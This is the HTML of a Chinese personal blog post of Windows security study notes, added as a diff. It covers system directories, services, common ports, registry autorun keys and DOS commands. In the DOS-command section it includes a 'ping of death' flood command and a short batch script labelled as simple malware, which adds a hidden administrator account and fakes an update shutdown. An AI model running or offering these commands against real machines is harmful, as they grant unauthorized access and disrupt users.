@@ -1,0 +1,618 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>Windows基础 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Windows基础">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-02-18 22:43" pubdate>
+        2020年2月18日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      23
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Windows基础</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习基础知识</p>
+<h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><h2 id="0-重要目录路径导航"><a href="#0-重要目录路径导航" class="headerlink" title="0.重要目录路径导航"></a>0.重要目录路径导航</h2><p>开机启动项： C:\Users（用户）\reader（你的用户名）\AppData（这个一般是隐藏文件，所以需要你自行打开）\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
+<p>系统的安装目录中需要记住的目录：C:\Windows\System32 （保存的都是系统的配置文件）</p>
+<p>保存用户和密码的：</p>
+<p><img src="/2020/02/18/Windows%E5%9F%BA%E7%A1%80/1581992276039.png" srcset="/img/loading.gif" alt="1581992276039"></p>
+<p>系统日志：PerfLogs是日志目录，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97/9389581">系统日志</a>是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。系统日志包括系统日志、应用程序日志和安全日志。</p>
+<h2 id="1-c盘根目录常见文件夹"><a href="#1-c盘根目录常见文件夹" class="headerlink" title="1.c盘根目录常见文件夹"></a>1.c盘根目录常见文件夹</h2><h3 id="Documents-and-Settings-用户-通常存储了用户的设置，包括用户文档、上网游览信息、配置文件等数据"><a href="#Documents-and-Settings-用户-通常存储了用户的设置，包括用户文档、上网游览信息、配置文件等数据" class="headerlink" title="Documents and Settings /用户 通常存储了用户的设置，包括用户文档、上网游览信息、配置文件等数据"></a>Documents and Settings /用户 通常存储了用户的设置，包括用户文档、上网游览信息、配置文件等数据</h3><p>包括了Administrators（针对系统管理员的账户）、All Users（针对所有用户）、DefaultUser、用户文件夹等</p>
+<p>Application Data:通用应用程序数据文件夹</p>
+<p>Local Settings: 保存应用程序数据和历史以及临时文件，可清理</p>
+<p>my documents:我的文档</p>
+<h3 id="Drivers-部分驱动程序的文件夹"><a href="#Drivers-部分驱动程序的文件夹" class="headerlink" title="Drivers:部分驱动程序的文件夹"></a>Drivers:部分驱动程序的文件夹</h3><h3 id="Favorites-收藏夹"><a href="#Favorites-收藏夹" class="headerlink" title="Favorites:收藏夹"></a>Favorites:收藏夹</h3><h3 id="Program-Files-应用程序文件夹，一般软件默认都安装在这里，也有一些系统自带的应用程序。在windows-7-系统中64位的用户会多出一个Program-Files（x86）的文件夹，这是系统中32位软件的安装目录"><a href="#Program-Files-应用程序文件夹，一般软件默认都安装在这里，也有一些系统自带的应用程序。在windows-7-系统中64位的用户会多出一个Program-Files（x86）的文件夹，这是系统中32位软件的安装目录" class="headerlink" title="Program Files: 应用程序文件夹，一般软件默认都安装在这里，也有一些系统自带的应用程序。在windows 7 系统中64位的用户会多出一个Program Files（x86）的文件夹，这是系统中32位软件的安装目录"></a>Program Files: 应用程序文件夹，一般软件默认都安装在这里，也有一些系统自带的应用程序。在windows 7 系统中64位的用户会多出一个Program Files（x86）的文件夹，这是系统中32位软件的安装目录</h3><p>Common Files: 共用程序文件夹，用于同系列不同程序软件共同使用或调用数据，比如微软和Adobe的各种软件</p>
+<p>ComPlus Applications:微软COM+组件使用的文件夹，删除后可能引起COM+组件不能运行</p>
+<h3 id="Program-Data-Windows-7-的系统文件夹，放置程序的使用数据、设置等文件，不建议删除"><a href="#Program-Data-Windows-7-的系统文件夹，放置程序的使用数据、设置等文件，不建议删除" class="headerlink" title="Program Data: Windows 7 的系统文件夹，放置程序的使用数据、设置等文件，不建议删除"></a>Program Data: Windows 7 的系统文件夹，放置程序的使用数据、设置等文件，不建议删除</h3><h3 id="Windows-存放操作系统主要文件，非常重要"><a href="#Windows-存放操作系统主要文件，非常重要" class="headerlink" title="Windows: 存放操作系统主要文件，非常重要"></a>Windows: 存放操作系统主要文件，非常重要</h3><h3 id="Temp-存放系统或其他软件临时文件"><a href="#Temp-存放系统或其他软件临时文件" class="headerlink" title="Temp: 存放系统或其他软件临时文件"></a>Temp: 存放系统或其他软件临时文件</h3><h3 id="hiberfil-sys-系统的休眠功能所占用的硬盘空间的文件，不建议删除"><a href="#hiberfil-sys-系统的休眠功能所占用的硬盘空间的文件，不建议删除" class="headerlink" title="hiberfil.sys:系统的休眠功能所占用的硬盘空间的文件，不建议删除"></a>hiberfil.sys:系统的休眠功能所占用的硬盘空间的文件，不建议删除</h3><h3 id="pagefile-sys-虚拟内存页面文件，不建议删除"><a href="#pagefile-sys-虚拟内存页面文件，不建议删除" class="headerlink" title="pagefile.sys:虚拟内存页面文件，不建议删除"></a>pagefile.sys:虚拟内存页面文件，不建议删除</h3><h3 id="PerfLogs-Windows系统的系统日志和记录"><a href="#PerfLogs-Windows系统的系统日志和记录" class="headerlink" title="PerfLogs: Windows系统的系统日志和记录"></a>PerfLogs: Windows系统的系统日志和记录</h3><h2 id="2-windows服务"><a href="#2-windows服务" class="headerlink" title="2.windows服务"></a>2.windows服务</h2><h3 id="2-1-服务的特点："><a href="#2-1-服务的特点：" class="headerlink" title="2.1 服务的特点："></a>2.1 <strong>服务的特点</strong>：</h3><p>①系统自动开启– ②不需要和用户交互– ③可长时间运行</p>
+<h3 id="2-2-对服务的管理有两种方式："><a href="#2-2-对服务的管理有两种方式：" class="headerlink" title="2.2 对服务的管理有两种方式："></a>2.2 对服务的管理有两种方式：</h3><p>用命令行管理、通过SCM（Windows服务控制管理器）管理</p>
+<h3 id="2-3-对服务进行控制的三种登录方式："><a href="#2-3-对服务进行控制的三种登录方式：" class="headerlink" title="2.3 对服务进行控制的三种登录方式："></a>2.3 对服务进行控制的三种登录方式：</h3><p><strong>2.3.1、以Local System账户（主要hacker的目标）运行的服务主要有</strong>：</p>
+<p>①Windows Update （Windows 更新）</p>
+<p>②Com+（管理基于组件对象模型 （COM+） 的组件的配置和跟踪）</p>
+<p>③Messenger Service （支持短信及相关功能）</p>
+<p>④Task Scheduler （在此计算机上配置和计划自动任务）</p>
+<p>⑤Server （支持此计算机通过网络的文件、打印、和命名管道共享）</p>
+<p>⑥Windows Installer （添加、修改和删除作为Windows Installer 程序包（. msi、 msp）提供的应用程序</p>
+<p>2.3.2、<strong>Network service(网络服务)</strong></p>
+<p>2.3.3、local service(本地服务)最小权限的本地账户</p>
+<h2 id="3-window端口（信息收集，目标单侧，服务判断，系统判断，系统角色分析）"><a href="#3-window端口（信息收集，目标单侧，服务判断，系统判断，系统角色分析）" class="headerlink" title="3.window端口（信息收集，目标单侧，服务判断，系统判断，系统角色分析）"></a>3.window端口（信息收集，目标单侧，服务判断，系统判断，系统角色分析）</h2><p>常见需要记住的端口：</p>
+<p>端口：21服务：FTP说明：FTP服务器所开放的端口，用于上传、下载。</p>
+<p>端口：22服务：Ssh说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。</p>
+<p> 端口：23服务：Telnet说明：Telnet远程登录。</p>
+<p> 端口：53服务：Domain Name Server（DNS）说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p>
+<p>端口：69/udp：TFTP（trivial file transfer protocol），</p>
+<p>端口：80/8080/3128/8081/9080：HTTP说明：用于网页浏览。木马Executor开放此端口。</p>
+<p>端口：110：SMTP（simple mail transfer protocol），即E-mail</p>
+<p>端口：135服务：Location Service说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。</p>
+<p>端口：443服务：Https说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。</p>
+<p>端口：1524服务：ingress说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p>
+<ol>
+<li>Win 2003远程登录，默认的端口号为3389</li>
+<li>Oracle数据库，默认的端口号为1521</li>
+<li>MS SQL*SERVER数据库server，默认的端口号为1433/tcp 1433/udp</li>
+<li>QQ，默认的端口号为1080/udp</li>
+</ol>
+<h2 id="Windows-服务"><a href="#Windows-服务" class="headerlink" title="Windows 服务"></a>Windows 服务</h2><p>常见服务：Web服务，dns服务，dhcp服务，邮件服务，telnet服务，ssh服务，ftp服务，smb服务</p>
+<p>其中ftp、pop、telnet服务在网络中都是<strong>明文</strong>传送口令和数据的</p>
+<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>利用注册表防病毒——</p>
+<p>不少计算机系统感染了网络病毒后，可能会在这些注册表中作出修改 </p>
+<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce\</p>
+<p>下次开机运行，并且只运行一次的项 </p>
+<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p>
+<p>开机自动启动的项 </p>
+<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</p>
+<p>在操作系统启动时就开始运行的程序，优先于run中的程序运行，如果没有也是正常的 </p>
+<p>我们所使用注册表防病毒的原理在于，就上上面说到的注册表在整个系统中起着核心的作用，任何软件硬件的使用都被注册表调度，所以只要一个病毒可以修改注册表，一定程度上他就控制了这台电脑 </p>
+<h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><p><strong>死亡ping</strong> : ping -t（命令不停） -l（指的是ip结尾断点） 65500 ip地址</p>
+<p>在这里顺道一提，我们可以发现，图中出现了一个叫做TTL的变量，这个变量是Time To Live的缩写，该字段表明IP包还能通过多少路由，举例来说，正常的win 7，就允许通过64个，然后图中显示，就是还能通过53个</p>
+<p>TTL的意义在于，帮助判断操作系统，确定还能通过多少路由</p>
+<p>查看系统信息：systeminfo</p>
+<p><strong>局域网入侵常用</strong>：arp -a 用于遍历各个借口的ip地址</p>
+<p>查找局域网内计算机：net view(需要在win10的控制面板/程序/功能中找到SMB1.0文件共享支持的功能并勾选上)</p>
+<p>终结命令：shutdown -s -t 180 -c “you are hacked by reader”</p>
+<p>目录查看：dir</p>
+<p>创建/删除目录：md(make directory) 名字 ;rd  目录名</p>
+<p>创建文件： copy con &lt;路径&gt;&lt;文件名&gt;</p>
+<p>打开文件（查看内容）：type 文件名</p>
+<p>连接目标共享盘符：net use k:\192.168.0.42\c$</p>
+<p>查看打开的服务：net start</p>
+<p>改变当前使用账户密码：net user admin1 要改的密码</p>
+<p>查看本地开启的共享：net share</p>
+<p>简单恶意程序制作：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">copy con c:\windows.bat<br>net<span class="hljs-built_in"> user </span>attack haha /add<br>net localgroup Administrators attack /add<br>shutdown -s -t 180 -c <span class="hljs-string">&quot;Your computer will shut down for update soon&quot;</span><br></code></pre></td></tr></table></figure>
+<h1 id="以上笔记的参考链接"><a href="#以上笔记的参考链接" class="headerlink" title="以上笔记的参考链接"></a>以上笔记的参考链接</h1><p>认识Windows的系统目录<br><a target="_blank" rel="noopener" href="https://www.jb51.net/os/windows/295904.html">https://www.jb51.net/os/windows/295904.html</a></p>
+<p>Windows的服务<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Z_Grant/article/details/90650111">https://blog.csdn.net/Z_Grant/article/details/90650111</a></p>
+<p>Windows的端口<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zzh_my/article/details/83573117">https://blog.csdn.net/zzh_my/article/details/83573117</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/windows%E5%9F%BA%E7%A1%80/">windows基础</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/02/18/mssql%E6%B3%A8%E5%85%A5%E6%91%98%E6%8A%84%E5%AD%A6%E4%B9%A0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">mssql注入摘抄学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/02/17/XSS%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">XSS漏洞学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
